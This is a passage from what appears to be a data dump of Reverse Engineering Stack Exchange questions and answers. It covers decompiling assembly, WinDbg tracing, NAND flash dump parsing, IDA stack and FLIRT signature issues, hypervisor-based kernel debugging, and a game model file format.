      v10 = (a2 - 1) &gt;&gt; 1;
      v11 = a1 + a4 * ((a2 - 1) &gt;&gt; 1);
      result = a5(v7, a1 + a4 * ((a2 - 1) &gt;&gt; 1), a6);
      if ( result &lt;= 0 )
        break;
      sub_401160(v11, v7, a4);
      a2 = (a2 - 1) &gt;&gt; 1;
      v7 = v11;
      result = v12;
    }
    while ( v12 &lt; v10 );
  }
  return result;
}
</code></pre>
","<p>It's a binary search.  I've renamed several of the variables, and in one case, introduced a new variable, because one of the local variables was used for one thing in the first half of the function and something else in the second half of the function.</p>

<p>The only tricky part is that once it finds an occurrence of the string to find, it iterates to find the <em>first</em> occurrence.</p>

<pre><code>#include &lt;string.h&gt;

typedef const char* MYTYPE;
typedef char* PTR_TYPE;

PTR_TYPE __cdecl SomeKindOfSortAlgorithm(MYTYPE elementToFind, PTR_TYPE array, unsigned int numElts, unsigned int eltSize, int (__cdecl *compare)(MYTYPE, PTR_TYPE), bool* pFound)
{
  PTR_TYPE mid; // esi@1
  int result; // eax@1
  PTR_TYPE lower_bound; // ebp@2
  PTR_TYPE upper_bound; // edi@2

  mid = 0;
  result = 0;
  *pFound = false;
  if ( !numElts )
    return NULL;
  lower_bound = array;
  upper_bound = array + eltSize * (numElts - 1);
  if ( array &gt; upper_bound )
  {
NOT_FOUND:
    if ( result &gt; 0 )
      mid += eltSize;
    return mid;
  }
  while ( 1 )
  {
    mid = lower_bound + eltSize * (upper_bound - lower_bound) / eltSize / 2;
    result = compare(elementToFind, mid);
    if ( result &lt; 0 ) // elementToFind should go before mid
    {
      if ( mid == array )
        goto NOT_FOUND;
      upper_bound = mid - eltSize;
      goto CHECK_LOOP_END;
    }
    if ( result &lt;= 0 ) // elementToFind equals the element at mid
      break;
    // elementToFind should go after mid
    lower_bound = mid + eltSize;
CHECK_LOOP_END:
    if ( lower_bound &gt; upper_bound )
      goto NOT_FOUND;
  }

  PTR_TYPE pFirstOccurrance;
  *pFound = true;
  if ( mid == array )
  {
AT_FIRST_ELEMENT:
    pFirstOccurrance = array;
  }
  else
  {
    while ( 1 )
    {
      mid -= eltSize;
      if ( compare(elementToFind, mid) ) // elementToFind != element at mid
        break;
      if ( mid == array )
        goto AT_FIRST_ELEMENT;
    }
    pFirstOccurrance = mid + eltSize;
  }
  return pFirstOccurrance;
}

int __cdecl StrCmpiWrapper(MYTYPE element, PTR_TYPE arrayPointer)
{
  return _strcmpi(element, *(MYTYPE*)arrayPointer);
}


int main(int argc, char* argv[])
{
  MYTYPE lookFor = ""def"";
  MYTYPE* pFirstOccurrance; // eax@1
  bool found; // [sp+10h] [bp-4h]@1

  MYTYPE data[3] = {
      ""abc"",
      ""def"",
      ""ghi""
  };

  pFirstOccurrance = (MYTYPE*)SomeKindOfSortAlgorithm(
         lookFor,
         (PTR_TYPE)data,
         3,
         sizeof(MYTYPE),
         StrCmpiWrapper,
         &amp;found);

  if ( !found &amp;&amp; pFirstOccurrance )
  {
      //Allocate memory .. copy it and other stuff here.
  }

    return 0;
}
</code></pre>
","4140"
"Can Windbg trace function calls within a module?","977","","<p>I want to log any functions within a specific module that are called during an execution. </p>

<p>I tried !for_each_function and wt command. However, since the target module doesn't have any symbols, !for_each_function cannot recognize any functions. wt command seems only able to trace with one function.</p>

<p>I know IDA debugger can trace function calls. But my current problem is that I only want to trace the functions in a specific module. I'm not sure if IDA can do that. Also I'm wondering if IDA debugger can break on module load (similar to 'sxe ld:modulename' in windbg..</p>

<p>I actually just need the address of all the function that are called. I was thinking if there is any way to set breakpoint on all RET within a module...But haven't figure out how to do that ... </p>
","<p>opening calc.exe in windbg </p>

<pre><code>windbg calc    
</code></pre>

<p>skipping all the ldrint system calls </p>

<pre><code>bp calc!WinMain ; g    
</code></pre>

<p>tracing only calc module from eip to some specific address and printing the return values
(please note using arbitrary values as EndAddress may possibly corrupt the 
code by inserting 0xcc in middle of instruction )  </p>

<pre><code>0:000&gt; wt -l 2 -oR -m calc =@eip @eip+5fa   
</code></pre>

<p>trace result with return values (trimmed )</p>

<pre><code>   30     0 [  0] calc!WinMain
    5     0 [  1]   kernel32!GetModuleHandleWStub
    1     0 [  1]   kernel32!GetModuleHandleW
   11     0 [  1]   KERNELBASE!GetModuleHandleW eax = b40000
   32    17 [  0] calc!WinMain
   11     0 [  1]   USER32!LoadStringW eax = a
   36    28 [  0] calc!WinMain
    3     0 [  1]   calc!CCalculatorSQM::onAppEntry
    5     0 [  2]     msvcrt!time
   24     0 [  2]     msvcrt!_time32 eax = 574fd43e
    5    29 [  1]   calc!CCalculatorSQM::onAppEntry eax = 574fd43e
   41    62 [  0] calc!WinMain
   12     0 [  1]   calc!McGenEventRegister
   38     0 [  2]     ntdll!EtwEventRegister eax = 0
   14    38 [  1]   calc!McGenEventRegister eax = 0
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
  364 12901 [  0] calc!WinMain
   24     0 [  1]   USER32!GetMessageW eax = 1
  372 12925 [  0] calc!WinMain
   21     0 [  1]   USER32!TranslateAcceleratorW eax = 0
  378 12946 [  0] calc!WinMain
   19     0 [  1]   calc!CContainer::HandleGlobalTabbing eax = 0
  382 12965 [  0] calc!WinMain

13347 instructions were executed in 13346 events (0 from other threads)
</code></pre>

<p>summary and wt broke where instructed</p>

<pre><code>ole32!CoInitialize                                    1       8       8       8
oleacc!ATL::CComObject&lt;CPropMgr&gt;::Release             1      16      16      16
oleacc!CPropMgr::SetHwndPropStr                       5      66      66      66

0 system calls were executed

eax=000cf030 ebx=00000000 ecx=00b94210 edx=76f070b4 esi=00b94210 edi=766e667e
eip=00b41c2f esp=000cef5c ebp=000cfcc4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
calc!WinMain+0x7d5:
00b41c2f e8e2010000      call    calc!CEditBoxInput::HandleWinMainMessage (00b41e16)
0:000&gt; ? calc!WinMain+5fa

note eip expression and EndAddress in wt command 
    Evaluate expression: 11803695 = 00b41c2f
</code></pre>
","12780"
"How to decompile this assembly code?","975","","<p>How can I convert the following IDA Pro generated disassembly (assembly language) into a higher level language?</p>

<pre><code>...
mov edx, Var1
mov ecx, Var2
mov eax, edx
imul ecx
mov edx, eax
imul edx, eax
mov Var3, ecx
...
</code></pre>

<p>I am trying to write a detailed pseudo code describing the function of the provided assembly snippet.</p>
","<p>Please note that there is no general 1:1 relation between assembly code and a higher level language, especially if the assembly was crafted manually. And even for compiled code there may be no good translation if the code was heavily optimized.</p>

<p>Also, note that reverse engineering is not about translating assembly to higher level language, it's about figuring out what's going on. For example, a year ago, someone asked this series of questions [<a href=""https://reverseengineering.stackexchange.com/questions/6858/create-key-generator-algorithm-from-validation-algo"">1</a>] [<a href=""https://reverseengineering.stackexchange.com/questions/6945/identify-a-decryption-scheme"">2</a>] [<a href=""https://reverseengineering.stackexchange.com/questions/8311/reverse-decryption-algorithm"">3</a>]. That guy meticuously translated a lot of assembly to C and wasn't any wiser; in the end, he could have saved himself 2 months if he had been able to recognize the RSA algorithm from the code.</p>

<p>Of course, a high level language implementation of something might be easier to read than assembly, so translating to high level might be <em>a part</em> of the work, but it's not the biggest part in most cases.</p>

<p>That said, as you have only 2 opcodes, one of which is <code>mov</code> which is the equivalent to an assignment:</p>

<pre><code>mov edx, Var1           ; edx=Var1
mov ecx, Var2           ; ecx=Var2
mov eax, edx            ; eax=edx (=Var1)
imul ecx                ; eax=eax*ecx (=Var1*Var2)
mov edx, eax            ; edx=eax (=Var1*Var2)
imul edx, eax           ; edx=edx*eax (=(Var1*Var2)^2)
mov Var3, ecx           ; var3=ecx (=Var2)
</code></pre>

<p>So, your code calculates (Var1*Var2)^2, but then assigns Var2 to Var3, not the calculated result. </p>

<p>If this was a homework question, i'd assume your teacher wanted to see if you're paying attention to detail. Also, it shows that there's no good translation to a high level language, because you don't generally calculate anything in them without using the result. Although, in C, you could have written</p>

<pre><code>(Var1*Var2)*(Var1*Var2);    // note the expression without an assignment
Var3=Var2;
</code></pre>

<p>but your compiler would normally throw away the first line of this.</p>
","11329"
"Convert assembly ADC to C#","974","","<p>I have this dissassembled routine from an executable but I am having troubles to translate it to C#.</p>

<pre><code>.text:005C9290 ; =============== S U B R O U T I N E =======================================
.text:005C9290
.text:005C9290 ; Attributes: bp-based frame
.text:005C9290
.text:005C9290 sub_5C9290      proc near               ; CODE XREF: .text:00574256p
.text:005C9290                                         ; sub_5ACC50+68p ...
.text:005C9290
.text:005C9290 SystemTimeAsFileTime= _FILETIME ptr -8
.text:005C9290 arg_0           = dword ptr  8
.text:005C9290
.text:005C9290                 push    ebp
.text:005C9291                 mov     ebp, esp
.text:005C9293                 push    ecx
.text:005C9294                 push    ecx
.text:005C9295                 lea     eax, [ebp+SystemTimeAsFileTime]
.text:005C9298                 push    eax             ; lpSystemTimeAsFileTime
.text:005C9299                 call    ds:GetSystemTimeAsFileTime
.text:005C929F                 mov     eax, [ebp+SystemTimeAsFileTime.dwLowDateTime]
.text:005C92A2                 mov     ecx, [ebp+SystemTimeAsFileTime.dwHighDateTime]
.text:005C92A5                 push    0
.text:005C92A7                 add     eax, 2AC18000h
.text:005C92AC                 push    offset unk_989680
.text:005C92B1                 adc     ecx, 0FE624E21h
.text:005C92B7                 push    ecx
.text:005C92B8                 push    eax
.text:005C92B9                 call    sub_5D0500
.text:005C92BE                 mov     ecx, [ebp+arg_0]
.text:005C92C1                 test    ecx, ecx
.text:005C92C3                 jz      short locret_5C92C7
.text:005C92C5                 mov     [ecx], eax
.text:005C92C7
.text:005C92C7 locret_5C92C7:                          ; CODE XREF: sub_5C9290+33j
.text:005C92C7                 leave
.text:005C92C8                 retn
.text:005C92C8 sub_5C9290      endp
.text:005C92C8
.text:005C92C9
</code></pre>

<p>However, I have this pseudo-code from this function generated by IDA Pro:</p>

<pre><code>__int64 __cdecl sub_5C9290(int a1)
{
  __int64 result; // qax@1
  unsigned __int64 v2; // ST00_8@1
  struct _FILETIME SystemTimeAsFileTime; // [sp+0h] [bp-8h]@1

  GetSystemTimeAsFileTime(&amp;SystemTimeAsFileTime);
  HIDWORD(v2) = ((_DWORD)SystemTimeAsFileTime.dwLowDateTime &gt;= 0xD53E8000u)
              + SystemTimeAsFileTime.dwHighDateTime
              - 27111903;
  LODWORD(v2) = SystemTimeAsFileTime.dwLowDateTime + 717324288;
  result = sub_5D0500(v2, (unsigned int)&amp;unk_989680, 0);
  if ( a1 )
    *(_DWORD *)a1 = result;
  return result;
}
</code></pre>

<p>One problems is that code won't compile, this code doesn't make sense:</p>

<pre><code>HIDWORD(v2) = ((_DWORD)SystemTimeAsFileTime.dwLowDateTime &gt;= 0xD53E8000u)
              + SystemTimeAsFileTime.dwHighDateTime
              - 27111903;
</code></pre>

<p>Also one problem is the <code>ADC</code> command which all I can find is that it is exactly as <code>ADD</code> but it also adds the <code>CARRY FLAG</code> to the result, but I can't find any ways to reproduce this command in C#.
And what about all those <code>HIDWORD</code> and <code>LODWORD</code> macros?</p>
","<p>This is 64-bit math. The compiler has to do the addition in two steps because the processor can only work 32 bits at a time. And carry has to be propagated from the low addition to the high one - same way when you do addition of multiple-digit numbers on paper.</p>

<p>Here's what the current version of the decompiler (1.7) produces (after fixing the function prototype):</p>

<pre><code>result = sub5D0500(time - 116444736000000000i64, 10000000i64);
</code></pre>

<p>And (just a guess) if you rename <code>sub5D0500</code> to <code>__alldiv</code> (compiler helper function for 64-bit division), it becomes:</p>

<pre><code>result = (time - 116444736000000000i64) / 10000000;
</code></pre>

<p>Apparently you're looking at MSVC's <code>_time64</code> implementation. From <code>time64.c</code>:</p>

<pre><code>/*
 * Number of 100 nanosecond units from 1/1/1601 to 1/1/1970
 */
#define EPOCH_BIAS  116444736000000000i64
[...]
__time64_t __cdecl _time64 (
        __time64_t *timeptr
        )
{
        __time64_t tim;
        FT nt_time;
        GetSystemTimeAsFileTime( &amp;(nt_time.ft_struct) );
        tim = (__time64_t)((nt_time.ft_scalar - EPOCH_BIAS) / 10000000i64);
        if (timeptr)
                *timeptr = tim;         /* store time if requested */
        return tim;
}
</code></pre>
","6157"
"Using a VMM/hypervisor to monitor guest OS execution?","974","","<p>I would like to set up a virtual machine monitor using Microsoft Hyper-V, VMware vSphere/ESX, Xen, or any other alternative hypervisor solution that is able to monitor the execution of a guest OS (a VM within the VMM). </p>

<p>In particular, I'd like to be able to view the guest OS' instructions before they are run by the virtual CPU. Additionally, I'd also like to be able to set monitors on some of the guest OS' CPU registers so if they are modified (e.g. on write with a MOV instruction), the guest's state will be suspended at the location where the write occurred (and the rip/eip will point to that instruction).</p>

<p>I've been searching for a VMM solution that exposes a way to accomplish my goals, but I couldn't find anything.</p>

<p>Does anyone know what the best way of approaching such a thing is? Any recommendations on the hypervisor that I should be using? (I'm guessing that Xen would probably be easiest to modify and debug since it's open source)</p>

<p>Thanks a lot.</p>

<p>Cheers,</p>

<hr>

<p><strong>EDIT:</strong> I'll try to explain myself better. I'm attempting to debug code running in kernel-mode (x86-64). Right now, I'm using WinDbg to debug the ring0 code in a virtual machine (VMware). </p>

<p>If I could, I would be more than happy in setting a hardware breakpoint (ba) on a memory location and seeing what reads/writes to it. The problem is that my hardware breakpoints are being disabled by the code running in ring0. Basically, this code is saving the contents of the dr7 register off, clearing it, accessing the memory that I'm watching (the memory I set the hardware breakpoint on), and finally is restoring the dr7 register after access. Thus, my hardware breakpoint is never hit. This means I never figure out where the memory was being manipulated from. Suffice it to say that software breakpoints are not an acceptable alternative. Additionally, I've also tried mucking around with the general-detect bit in dr7 and installed my own trap handler to understand if someone's screwing with my hardware breakpoints. However, this code is quite smart and handles this attempt nicely (re: restores the old hook before accessing any of the debug registers).</p>

<p>I hope you now see my conundrum. I need to be running at a lower level than ring0 to deal with this code running at ring0. The only way to do that is in a hypervisor. </p>

<p>I would like to monitor the contents of say the dr7 register and see what's accessing it (read/writes). If I find the RIP of the faulting code, I'll be able to step through it and understand more of what it's doing.</p>
","<p><a href=""http://www.google.com/search?q=vmware%20gdb%20stub"" rel=""nofollow"">VMware exposes a GDB stub</a> specifically for this purpose. Using this stub, one can connect GDB (or any GDB front-end) to manipulate the guest OS, as if it were a process.</p>

<ul>
<li><a href=""http://wiki.osdev.org/VMware"" rel=""nofollow"">VMware</a> - OSDev Wiki</li>
<li><a href=""https://www.hex-rays.com/products/ida/support/tutorials/debugging_gdb_windows_vmware.pdf"" rel=""nofollow"">Debugging Windows kernel under VMWare using 
IDA's GDB debugger</a> - HexRays</li>
</ul>
","3963"
"Extracting a NAND flash dump with OOB data","970","","<p>I'm trying to extract a NAND flash dump of an old Walkman player. The dump was done by a friend and unfortunately cannot be redone because the chip was destroyed.
The dump was supposed to be just user data without OOB but it seems something went wrong and OOB is still there. 
I tried various ways of removing OOB and I can get some reasonably-looking data but many things are still off and I can't extract proper files.</p>

<p>Here's what I tried.</p>

<p>Just by looking visually into hex dump, there are a 16-byte lines beginning with ""01 00 00 00"" 
every 0x200 bytes which look out of place. 
<a href=""https://i.stack.imgur.com/u4YMX.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/u4YMX.png"" alt=""hex dump""></a>
I made a short script to remove 16 bytes after every 0x200:</p>

<pre><code>import sys
inf = open(sys.argv[1] ,""rb"")
of = open(sys.argv[2],""wb"")
clen = 0x200
c = inf.read(clen)
off = 0
while c:
  off = inf.tell()
  oob = inf.read(0x10)
  if oob[:4]!=""\x01\x00\x00\x00"":
   print "" bad OOB at %08X?"" % off, oob.encode('hex')
   break
  of.write(c)
  if (off&amp;0x1000) ==0:
   print ""%08X"" % off
  c = inf.read(clen)


inf.close()
of.close()
print ""done.""
</code></pre>

<p>The added sanity check triggers pretty quickly:</p>

<pre><code>00000200
00000410
00000620
00000830
00000A40
00000C50
00000E60
 bad OOB at 00001070? 042080e4fbffffea10009fe530ff2fe1
done.
</code></pre>

<p>And indeed, the next line starting with 01 00 00 00 is at 1240, not 1070. I tried to account for it and restart, but 
I ran into similar issues later. So I wonder if I'm missing something. 
The full file is 4GB which is a bit heavy so here are few cut out chunks:</p>

<ol>
<li>beginning of the dump (initial bootloader?). <a href=""http://filebin.ca/3GSGqkvCosrS/chunk0.bin"" rel=""nofollow noreferrer"">offset 0</a></li>
<li>start of U-boot bootloader. <a href=""http://filebin.ca/3GSHLyfp2t46/chunk_104000.bin"" rel=""nofollow noreferrer"">offset 0x104000</a></li>
<li>start of the kernel image.<a href=""http://filebin.ca/3GSI6oIkNWUl/chunk_186000.bin"" rel=""nofollow noreferrer"">offset 0x186000</a></li>
</ol>

<p>if you'd like to see the whole dump I've shared a link in <a href=""http://chat.stackexchange.com/transcript/message/36175953#36175953"">our chat</a>.</p>

<p>Hardware details:
Device is Sony Walkman NWZ-A829. 
The flash chip is most likely TH58NVG6D1DTG20. 
The CPU is a NEC MP201 (ARMv5le).</p>

<p>GPL sources (U-Boot/Linux kernel) are available here: <a href=""http://oss.sony.net/Products/Linux/Audio/NWZ-S715.html"" rel=""nofollow noreferrer"">http://oss.sony.net/Products/Linux/Audio/NWZ-S715.html</a></p>

<p>The final goal is to figure out the firmware update encryption and produce custom firmware for the device.</p>
","<p>So, I have figured it out myself in the end. I'll try to describe the process.</p>

<p>First, a bit of background on NAND: it is organized in pages which are grouped into blocks. You can read or write a single page at a time but erasing (which turns all bits to 1s (so bytes to FFs)) can be only done one block at a time (writing can only change bits from 1 to 0 but not the other way around, so to write new data the block usually has to be erased first). Usually the chip also has some extra storage per page to store ECC (error-correction code) and/or arbitrary ""spare"" data (also called OOB: out-of-band) which is not considered to be part of the useful storage of the chip but can still be read and written using low-level functions.</p>

<p>While browsing the hex dump, I came across this region after a bunch of FFs:</p>

<blockquote>
<pre><code>0000081FE0: FF FF FF FF FF FF FF FF │ FF FF FF FF FF FF FF FF          
0000081FF0: FF FF FF FF FF FF FF FF │ FF FF FF FF FF FF FF FF          
0000082000: 6C 4F 41 64 00 00 00 00 │ 00 00 00 00 00 00 00 00  lOAd
0000082010: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00
0000082020: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00
0000082030: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00
0000082040: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00
0000082050: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00
</code></pre>
</blockquote>

<p>It had the usual OOB-looking 16-byte chunks after each 0x200 bytes but then something different:</p>

<blockquote>
<pre><code>83040: 70 41 52 74 18 00 00 00 │ 48 00 00 00 90 00 00 00  pARt↑   H   
83050: A0 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00   
83060: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00
....
84080: 75 42 54 74 20 00 00 00 │ 02 00 00 00 00 00 00 00  uBTt    ☻
84090: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00
840A0: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00
840B0: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00
</code></pre>
</blockquote>

<p>What's this? Sounds like U-Boot. Let's check U-boot sources from Sony's website... and bingo!</p>

<pre><code> /* for Loader Management */
 #define MNG_SIG_LOADER         0x64414F6C      /* ""lOAd"" */
 #define TBL_SIG_PART           0x74524170      /* ""pARt"" */
 #define TBL_SIG_UBOOT          0x74544275      /* ""uBTt"" */
 #define TBL_SIG_FUKRNL         0x744B5566      /* ""fUKt"" */
 #define TBL_SIG_FUINRD         0x74525566      /* ""fURt"" */
 #define TBL_SIG_BAD                0x74444162      /* ""bADt"" */

 #define    MNG_SIG_KRNL            0x6C4E526B      /* ""kRNl"" */
 #define TBL_SIG_KRNL           0x744C4E6B      /* ""kNLt"" */
 #define TBL_SIG_INRD           0x74445269      /* ""iRDt"" */
</code></pre>

<p>(from <code>icx1087_nand.c</code>)
So, apparently these blocks are related to ""Loader Management""... looking at the references we come across this code chunk:</p>

<pre><code>/* read management table */
for( rty = 0; rty &lt; NAND_READ_RETRY; rty++ ) {
    if( nand_search_tbl(NAND_BLK_LOADER_START, NAND_BLK_LOADER_LMT,
                        MNG_SIG_LOADER, TBL_SIG_PART, (void *)&amp;ptbl, 0) ) {
            continue;
    }
    /* success to read Kernel information if reach here */
    break;
}
</code></pre>

<p>So, it's looking for <code>MNG_SIG_LOADER</code> (lOAd) in the NAND block NAND_BLK_LOADER_START. And the value is...</p>

<pre><code>#define NAND_BLK_LOADER_START   1
</code></pre>

<p>So looks like 82000 is the start of NAND block 1. If we check the code further, we can see that it's looking for other signatures (e.g. <code>TBL_SIG_PART</code> or <code>TBL_SIG_FUKRNL</code>) in <em>pages</em> of this block. And let's see:</p>

<ul>
<li><p>MNG_SIG_LOADER: 82000 (block 1 page 0?)</p></li>
<li><p>TBL_SIG_PART: 83040 (block 1 page 1?)</p></li>
<li><p>TBL_SIG_UBOOT: 84080 (block 1 page 2?)</p></li>
</ul>

<p>83040-82000=1040  and 84080-83040=1040 too! So looks like the page size in the dump is 1040. and 1040*128 =82000 which means we have 128 pages per block. The actual data is probably 0x1000 bytes and 0x40 is the ""spare"" data. So, this explains why I had desynchronization after each four 0x200 sectors: there are 8 sectors per page but only 0x40 bytes of OOB data.</p>

<p>I'm not sure why the dump ended up having such weird structure; I think it's because the software used for dumping (IIRC it was <a href=""https://github.com/ohjeongwook/DumpFlash"" rel=""noreferrer"">DumpFlash</a> by Matt Oh) assumes 512-byte pages in many places and somehow the OOB data ended up being spread in chunks instead of being grouped at the end of each page. Possibly it's also related to this passage in <a href=""https://toshiba.semicon-storage.com/ap-en/product/memory/nand-flash/detail.TC58NVG0S3HTA00.html"" rel=""noreferrer"">the datasheet</a> for a similar (but not same) Toshiba chip:</p>

<blockquote>
  <p>8 bit ECC for each 512Byte is required</p>
</blockquote>

<p>(but no explanation on how it should be done)</p>

<p>In any case, once I figured out the magic numbers of 0x1040 for page size and 128 pages per block, it was not difficult to fix my script:</p>

<pre><code>NAND_PAGE_SIZE  = 0x1000
NAND_PAGE_BLK   = 128
NAND_SECTOR_PER_PAGE = 8
NAND_SECTOR_SIZE = NAND_PAGE_SIZE/NAND_SECTOR_PER_PAGE
OOBLEN = 16

def page2off(pgno):
  return pgno*0x1040 # (NAND_PAGE_SIZE + NAND_SECTOR_PER_PAGE*OOBLEN)

def read_page(inf, blkno, pgno):
 blklen = page2off(NAND_PAGE_BLK)
 fileoff = blklen*blkno + page2off(pgno)
 print ""reading block %d page %d: offset %08X"" % (blkno, pgno, fileoff)
 inf.seek(fileoff, 0)
 block = inf.read(blklen)
 s = """"
 soff =0
 for i  in range(NAND_SECTOR_PER_PAGE):
  print ""sector %d offset %08X"" % (i, soff)
  s+= block[soff:soff+NAND_SECTOR_SIZE]
  soff += NAND_SECTOR_SIZE+OOBLEN
 return s
</code></pre>

<p>With this I could dump parts of the flash with the kernel and ramdisk and extract the binaries.</p>
","15099"
"SP analysis failed in gfortran compiled application","970","","<p>I need assistance in ida pro regarding sp analysis failure.
The link to the dissembled function is here:
<a href=""http://pastebin.com/XRwzswgS"" rel=""nofollow"">http://pastebin.com/XRwzswgS</a>
The program has a lot of these errors which hinders hexrays decompilation.
The analysis failure is shown in line 333 in pastebin. I have included the SP pointer values from ida</p>
","<p>In a line 34 you have a following code:</p>

<pre><code>.text:0046FC96 010                 mov     eax, 3AFCh
.text:0046FC9B 010                 call    __alloca
</code></pre>

<p>This code allocates <code>0x3afc</code> bytes on stack and this allocation is not reflected in IDA stack analysis (if the assumption that <code>_alloca</code> function detected and defined correctly is correct, see <a href=""http://man7.org/linux/man-pages/man3/alloca.3.html"" rel=""nofollow"">linux alloca man page</a> and <a href=""https://msdn.microsoft.com/en-us/library/wb1s57t5.aspx"" rel=""nofollow"">MSDN alloca documentation</a> for more details about this function).</p>

<p>To fix this you should go to <code>call _alloca</code> instruction, press <kbd>ALt</kbd>-<kbd>K</kbd> and insert the needed value (probably <code>-0x3afc</code> in your specific case, but I'm not sure).</p>

<p>This will hint IDA that there is a stack pointer change here.</p>
","9474"
"IDA startup signatures format","966","","<p>IDA startup signatures are sets of signatures used in FLIRT to detect what library is used in a static linked executable .<br>
I am about to use these signatures to detect which library is used in an executable file .
<br>I must use pattern files in IDA FLIAR in startup folder .<br>but i don't know it's format and what does each field mean (:?)<br>
here are a few sample pattern :</p>

<pre><code>1)8BFF558BECE8........E8........5DC3.............................. 00 0000 0011 :0000 s=A/- ^0006 ___security_init_cookie ^000B ___tmainCRTStartup
2)6A0C68........E8........8BF98BF28B5D0833C0408945E485F6750C3915.. 00 0000 00F6 :0000 o=2:a=108:vc32rtf:l=vc32mfc/vcextra/vc8atl:m=+67^[_DllMain@12]~msmfc2d/~@vc32mfc@; :00E4@ $LN18 :00E3@ $LN25 :00D3@ $LN29 :00D3@ $LN17 ^0003 __sehtable$___DllMainCRTStartup ^0008 __SEH_prolog4 ^001F ___proc_attached ^0037 __pRawDllMain ^0055 __CRT_INIT@12 ^0068 _DllMain@12 ^00DD ___CppXcptFilter ^00F1 __SEH_epilog4 ......0F84C50000008365FC003BF0740583FE02752EA1........85C07408575653FFD08945E4837DE4000F8496000000575653E8........8945E485C00F8483000000575653E8........8945E483FE01752485C07520575053E8........576A0053E8........A1........85C07406576A0053FFD085F6740583FE037526575653E8........85C075032145E4837DE4007411A1........85C07408575653FFD08945E4C745FCFEFFFFFF8B45E4EB1D8B45EC8B088B095051E8........5959C38B65E8C745FCFEFFFFFF33C0E8........C3
</code></pre>

<p>i could 't find any relevant content on the internet.
can any body help me about the format?
<br>
More about my need:
<br>
I want to find library functions in PE files (on my own program not by IDA) and ,as there are a huge amount of FLAIR pattern for all libraries , I cannot load them altogether because of memory and speed issues .<br>
I have also read pat.txt in IDA FLAIR and i know the patterns format but startup signatures format is a bit different and has new parts so I want to know about these new parts like :
<code>
 o=2:a=108:vc32rtf:l=vc32mfc/vcextra/vc8atl:m=+67^[_DllMain@12]~msmfc2d/~@vc32mfc@;
</code></p>
","<p>First, you should begin by reading through pat.txt which is included with the IDA flair utilities. It describes the format of .pat files. </p>

<p>Second it would be helpful if you can clarify what you are trying to do. What processor/file type are you working with? In many cases you do not need to directly manipulate .pat files at all since Hex-Rays provides tools to generate .pat files and .sig files from those .pat files. </p>

<p>Third, it is not clear exactly what type of signatures you are trying to work with and why. IDA ""startup"" signatures are a special form of signature used the when you first create a database for a new binary file. The purpose of startup signatures is to identify startup routines and the compiler used to create the binary. This may in turn trigger the loading of additional library signature files. Library signature files are the ones used to recognize the presence of library code that has been statically linked into a binary. Signatures are usually generated by parsing a copy of the static link libraries that were linked into the binary you are interested in. The most common case for needing to understand the .pat file format is when the parsers that Hex-Rays ships with flair are not capable of parsing the link libraries that you are trying to create patterns from.</p>

<p>This link may also be useful: <a href=""https://www.hex-rays.com/products/ida/tech/flirt/in_depth.shtml"" rel=""nofollow"">Hex-Rays FLIRT</a></p>
","3862"
"Reverse engineering Earthsiege 2 3D model format","965","","<p>As a personal project I've been trying to reverse engineer the art assets for the old Dynamix game Earthsiege 2 (this game has long been abandonware and was recently released for free by Hi-Rez, the current copyright holder). It was child's play to decode the images/textures, but I've been having trouble with the binary 3D model format.</p>

<p>As some background, the 3D models are saved as DTS files. DTS is a proprietary binary format (little-Endian), short for ""Dynamix Three-Space"". I wasn't able to find any resources on reversing ES2-era DTS files.</p>

<p>For this post I'll focus on the Apocalypse. </p>

<p><a href=""https://i.stack.imgur.com/6Kv1A.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/6Kv1A.png"" alt=""The Apocalypse in-game; take note there are discrete parts rather than a single mesh""></a></p>

<p>The Apocalypse model is stored in <code>Apoca.dts</code> . The file starts out like this (in hex, with annotations):</p>

<pre><code>  | File size |     ?     |ChunkMarker|Chunk Length
02|7C 7F 01 00|4B 1F 3D 7F|03 00 1E 00|FC 5F 00 
00|FF FF 00 00 0E 08 BF FF CC FF 23 04 01 00 15 
00 14 00 70 46 00 00 FF FF 00 00 B7 06 BF FF CC 
FF 23 04 1B 00 14 00 14 00 4A 01 00 00 01 00 0C 
00 AB 01 FB FF 22 00 7B 05 18 00 0F 00 10 00 06  &lt;-Faces
00 02 00 03 00 04 00 05 00 02 00 05 00 07 00 08 
00 0A 00 0B 00 04 00 03 00 03 00 02 00 08 00 0A 
00 0B 00 07 00 05 00 04 00 0A 00 08 00 07 00 0B 
00 00 00 1D 00 FF 07 00 00 00 00 00 00 24 FF 72  &lt;-Some vertices here
01 82 05 DC 00 72 01 82 05 DC 00 C0 FE 8C 05 24  &lt;-
FF C0 FE 8C 05 00 F8 00 00 00 00 24 FF E8 FE 00  &lt;-
05 24 FF 04 01 60 04 00 08 00 00 00 00 DC 00 04  &lt;-
01 60 04 DC 00 E8 FE 00 05 00 00 7A 07 2A FD 00  &lt;-
00 4F F8 CE FD 00 00 BB FD 55 F8 02 00 00 04 02 
00 00 04 00 00 00 14 00 00 00 14 00 00 00 00 FF 
FF FF FF FF FF FF FF FF FF FF FF 1B 00 00 00 FF 
FF FF FF FF FF FF FF FF FF FF FF 19 00 00 00 FF 
FF FF FF FF FF FF FF FF FF FF FF 03 00 14 00 0A 
00 00 00 00 00 02 00 04 00 00 00 00 00 03 00 14
</code></pre>

<p>For formatted/color-coded analysis, see <a href=""http://postimg.org/image/8e56re90n/"" rel=""nofollow noreferrer"">http://postimg.org/image/8e56re90n/</a></p>

<p>To see the first 3 chunks of the file in their entirety, see <a href=""http://pastebin.com/RTFkdiBd"" rel=""nofollow noreferrer"">http://pastebin.com/RTFkdiBd</a></p>

<h2>Current knowledge</h2>

